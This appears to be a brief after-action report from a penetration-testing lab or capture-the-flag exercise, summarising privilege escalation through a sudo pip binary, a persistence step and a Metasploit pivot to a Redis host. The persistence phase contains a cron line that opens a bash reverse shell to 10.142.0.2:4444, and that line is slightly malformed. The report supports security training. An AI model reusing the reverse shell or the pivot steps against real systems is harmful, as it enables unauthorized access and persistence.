# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:** Shatiqua Talley

## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** /usr/bin/pip
* **GTFOBins Exploit Command Used:** sudo /usr/bin/pip

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:**  * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.142.0.2/4444 0>&1']
* **Persistence Confirmed:** Yes

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** autoroute -s 10.0.10.0/24 and use auxiliary/server/socks_proxy
* **Hidden Database IP Discovered:** 10.0.10.50
* **Open Port on Hidden Database:** 6379/tcp (Redis)
